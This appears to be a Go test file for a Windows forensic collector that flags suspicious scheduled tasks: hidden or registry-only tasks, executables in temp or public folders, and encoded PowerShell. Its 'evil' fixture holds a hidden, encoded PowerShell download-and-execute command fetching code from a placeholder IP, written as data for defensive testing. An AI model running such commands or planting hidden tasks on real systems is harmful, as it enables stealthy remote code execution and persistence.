package collector

import "testing"

func TestJudgeTask(t *testing.T) {
	quiet := taskDef{Execs: []taskExec{
		{Command: `%windir%\system32\rundll32.exe`, Arguments: `%windir%\system32\Windows.StateRepositoryClient.dll,StateRepositoryDoMaintenanceTasks`},
		{Command: `"C:\Program Files\Google\Update\GoogleUpdate.exe"`, Arguments: `/ua /installsource scheduler`},
		{Command: `C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.24090.11-0\MpCmdRun.exe`, Arguments: `Scan -ScheduleJob -ScanTrigger 55`},
	}}
	if got := judgeTask(`\Microsoft\Windows\X`, quiet); len(got) != 0 {
		t.Fatalf("unexpected findings %v", keys(rulesOf(got)))
	}

	evil := taskDef{Hidden: true, Execs: []taskExec{
		{Command: `%TEMP%\upd.exe`},
		{Command: `powershell.exe`, Arguments: `-w hidden -enc ` + psEncode("IEX (iwr 'http://198.51.100.8/a')")},
		{Command: `update.exe`, WorkingDirectory: `C:\Users\Public`},
		{Command: `C:\Program Files\App\app.exe`, Arguments: `--cfg C:\Users\Public\app.cfg`},
	}}
	got := rulesOf(judgeTask(`\Updater`, evil))
	for _, w := range []string{"persistence.scheduled_task_unusual_path", "exec.download_execute", "exec.powershell_encoded"} {
		if _, ok := got[w]; !ok {
			t.Errorf("%s missing (got %v)", w, keys(got))
		}
	}
	if f := got["persistence.scheduled_task_unusual_path"]; f.Confidence != 75 {
		t.Errorf("hidden task confidence %d, want 75", f.Confidence)
	}
	// The working-directory case alone must be caught too.
	wd := judgeTask(`\X`, taskDef{Execs: []taskExec{{Command: `update.exe`, WorkingDirectory: `C:\Users\Public`}}})
	if len(wd) != 1 {
		t.Errorf("bare command in a risky working directory not flagged: %v", wd)
	}
}

func TestTaskCacheFindings(t *testing.T) {
	files := []string{`\Microsoft\Windows\Defrag\ScheduledDefrag`, `\Orphan`, `\Hidden`}
	cache := []taskCacheEntry{
		{Path: `\Microsoft\Windows\Defrag\ScheduledDefrag`, HasSD: true},
		{Path: `\Hidden`, HasSD: false},
		{Path: `\RegistryOnly`, HasSD: true},
	}
	got, regOnly := taskCacheFindings(files, cache, true)
	if len(got[`\microsoft\windows\defrag\scheduleddefrag`]) != 0 {
		t.Error("healthy task flagged")
	}
	if f := rulesOf(got[`\hidden`]); f["persistence.scheduled_task_hidden"].Severity != SevCritical {
		t.Errorf("Tarrask-style task not critical: %v", f)
	}
	if _, ok := rulesOf(got[`\registryonly`])["persistence.scheduled_task_no_file"]; !ok || len(regOnly) != 1 {
		t.Errorf("registry-only task not reported: %v %v", got[`\registryonly`], regOnly)
	}
	if _, ok := rulesOf(got[`\orphan`])["persistence.scheduled_task_unregistered"]; !ok {
		t.Error("unregistered task file not reported")
	}
	// Without a readable cache, nothing can be called unregistered.
	if got, _ := taskCacheFindings(files, nil, false); len(got) != 0 {
		t.Errorf("findings without a cache: %v", got)
	}
	// A partial cache read must not make every unread task "unregistered".
	partial, _ := taskCacheFindings(files, cache[:1], false)
	if _, ok := rulesOf(partial[`\orphan`])["persistence.scheduled_task_unregistered"]; ok {
		t.Error("unregistered reported from an incomplete cache")
	}
}

func TestTaskPathFromFile(t *testing.T) {
	if got := taskPathFromFile("/w/Tasks", "/w/Tasks/Microsoft/X"); got != `\Microsoft\X` {
		t.Fatal(got)
	}
	if got := taskCommand(taskExec{Command: `C:\Program Files\x.exe`, Arguments: "-a"}); got != `"C:\Program Files\x.exe" -a` {
		t.Fatal(got)
	}
}
